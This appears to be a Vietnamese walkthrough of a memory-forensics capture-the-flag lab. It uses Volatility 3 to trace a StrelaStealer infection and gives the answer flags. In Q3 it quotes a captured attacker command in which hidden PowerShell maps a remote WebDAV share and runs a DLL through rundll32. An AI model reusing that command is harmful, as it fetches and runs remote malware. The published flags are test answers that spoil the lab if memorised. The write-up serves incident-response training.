# Phân tích sự cố (Incident Response) - Endpoint & Memory Forensics

**Mức độ:** Dễ | **Công cụ:** Volatility 3

**Kịch bản:** Bạn là chuyên gia điều tra kỹ thuật số tại một tổ chức tài chính. Hệ thống SIEM vừa phát cảnh báo về các dấu hiệu hoạt động bất thường trên một máy trạm có quyền truy cập vào dữ liệu tài chính nhạy cảm. Nghi ngờ có sự cố xâm nhập, bạn nhận được bản sao bộ nhớ (memory dump) từ máy trạm bị ảnh hưởng. Nhiệm vụ của bạn là phân tích bộ nhớ để tìm kiếm các Dấu hiệu Thỏa hiệp (IOCs), truy vết nguồn gốc dị thường và đánh giá phạm vi ảnh hưởng để đưa ra phương án ngăn chặn hiệu quả.

---

### Q1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

*   **Cách làm:** Sử dụng plugin `windows.malware.malfind` để rà quét và phân tích các vùng nhớ có dấu hiệu bị tiêm mã độc (Code/Memory Injection).
*   **Thao tác thực hiện:** Thực thi lệnh `python3 vol.py -f 192-Reveal.dmp windows.malware.malfind`. Kết quả phân tích cho thấy tiến trình `powershell.exe` (PID: 3692) chứa các phân vùng bộ nhớ được cấp quyền `PAGE_EXECUTE_READWRITE` (RWX). Trong trạng thái hoạt động bình thường, tiến trình này hiếm khi yêu cầu phân quyền thực thi và ghi đồng thời trên cùng một phân vùng. Đây là dấu hiệu đặc trưng của kỹ thuật thực thi mã độc trên bộ nhớ (Fileless Malware) nhằm lẩn tránh các cơ chế phát hiện tĩnh của giải pháp Antivirus/EDR.
*   **Bằng chứng:**
    ![Q1 - Phát hiện powershell.exe bị tiêm mã độc](images/q1_malfind.png)
*   **Flag:** `powershell.exe`

---

### Q2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

*   **Cách làm:** Sử dụng plugin `windows.pstree` để tái dựng cây tiến trình, qua đó xác định tiến trình cha (Parent Process) và truy vết luồng thực thi ban đầu.
*   **Thao tác thực hiện:** Thực thi lệnh `python3 vol.py -f 192-Reveal.dmp windows.pstree`. Từ kết quả kết xuất, định vị tiến trình `powershell.exe` (PID: 3692). Đối chiếu thông số tại cột PPID, ta xác định được mã định danh của tiến trình cha là `4120`. 
*   **Bằng chứng:**
    ![Q2 - Truy vết Parent PID 4120](images/q2_pstree.png)
*   **Flag:** `4120`

---

### Q3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

*   **Cách làm:** Trích xuất và phân tích tham số dòng lệnh (Command Line arguments) của tiến trình khả nghi.
*   **Thao tác thực hiện:** Bằng việc phân tích tham số dòng lệnh của tiến trình thông qua plugin `windows.cmdline` (hoặc xem trực tiếp từ kết xuất của `pstree`), ta thu được chuỗi thực thi: 
    `powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`
    Cú pháp này cho thấy kẻ tấn công đã chỉ định tiện ích hệ thống `rundll32.exe` để gọi và thực thi tệp thư viện liên kết động có tên `3435.dll`. Tệp tin này đóng vai trò là payload giai đoạn 2 (second-stage payload) của chuỗi tấn công.
*   **Bằng chứng:**
    ![Q3 - Tham số dòng lệnh thực thi payload](images/q3_cmdline.png)
*   **Flag:** `3435.dll`

---

### Q4: Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

*   **Cách làm:** Phân tích các dấu hiệu kết nối mạng (Network Indicators) từ tham số dòng lệnh.
*   **Thao tác thực hiện:** Dựa trên chuỗi lệnh đã trích xuất ở Q3, cú pháp `net use \\45.9.74.32@8888\davwwwroot\` thể hiện hành vi ánh xạ một thư mục chia sẻ trên máy chủ C2 (Command and Control) vào hệ thống cục bộ thông qua giao thức WebDAV/SMB. Tên của định tuyến chia sẻ (shared directory) được xác định là `davwwwroot`.
*   **Bằng chứng:**
    *(Xem chi tiết tại hình ảnh Bằng chứng Q3)*
*   **Flag:** `davwwwroot`

---

### Q5: What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

*   **Cách làm:** Ánh xạ hành vi thực thi với khung tham chiếu rủi ro bảo mật MITRE ATT&CK.
*   **Thao tác thực hiện:** Hành vi sử dụng `rundll32.exe` để thực thi tệp `.dll` độc hại là một kỹ thuật LOLBAS (Living Off The Land Binaries and Scripts). Việc lợi dụng các tệp tin thực thi hợp pháp và có chữ ký số gốc của hệ điều hành giúp mã độc che giấu luồng hoạt động (Proxy Execution) và vượt qua các cơ chế kiểm soát bảo mật. Tra cứu trên cơ sở dữ liệu MITRE ATT&CK, kỹ thuật này được định danh là **Signed Binary Proxy Execution: Rundll32**.
*   **Bằng chứng:**
    *(Xem chi tiết tại hình ảnh Bằng chứng Q3 - chú ý tiện ích rundll32)*
*   **Flag:** `T1218.011`

---

### Q6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

*   **Cách làm:** Trích xuất thông tin Security Identifiers (SIDs) để xác định định danh người dùng và mức độ đặc quyền của tiến trình.
*   **Thao tác thực hiện:** Thực thi lệnh `python3 vol.py -f 192-Reveal.dmp windows.getsids.GetSIDs | grep "3692"`. Kết quả trả về danh sách các SID liên kết với tiến trình. Đối chiếu cấu trúc hệ thống, định danh chủ thể người dùng (mang mã RID 1001) đang sở hữu luồng thực thi này là `Elon`. Việc xác định user context cho thấy tài khoản bị xâm phạm mang cả đặc quyền `Administrators` và `Domain Users`, báo hiệu rủi ro an ninh nghiêm trọng.
*   **Bằng chứng:**
    ![Q6 - Trích xuất SID và Username](images/q6_getsids.png)
*   **Flag:** `Elon`

---

### Q7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

*   **Cách làm:** Tích hợp dữ liệu Tình báo Mối đe dọa (Threat Intelligence) để định danh họ mã độc (Malware Family).
*   **Thao tác thực hiện:** Đầu tiên, từ kết quả truy vết tham số dòng lệnh, ta xác định được địa chỉ IP C2 độc hại là `45.9.74.32`. Tiếp theo, trích xuất Dấu hiệu Thỏa hiệp (IOC) này và tiến hành truy vấn chéo trên nền tảng phân tích bảo mật VirusTotal. Dữ liệu hành vi và các báo cáo cộng đồng chỉ ra rằng chuỗi tấn công và hạ tầng mạng này thuộc về họ mã độc **StrelaStealer** - một biến thể mã độc chuyên thu thập và đánh cắp thông tin đăng nhập từ các máy khách email (Email Clients).
*   **Bằng chứng:**
    ![Q7 - Trích xuất IP C2](images/q7_extract_ip.png)
    *Hình 1: Xác định IP độc hại từ tiến trình thực thi.*
    
    ![Q7 - Tra cứu IOCs trên VirusTotal](images/q7_virustotal.png)
    *Hình 2: Kết quả tra cứu định danh mã độc StrelaStealer trên VirusTotal.*
*   **Flag:** `StrelaStealer`
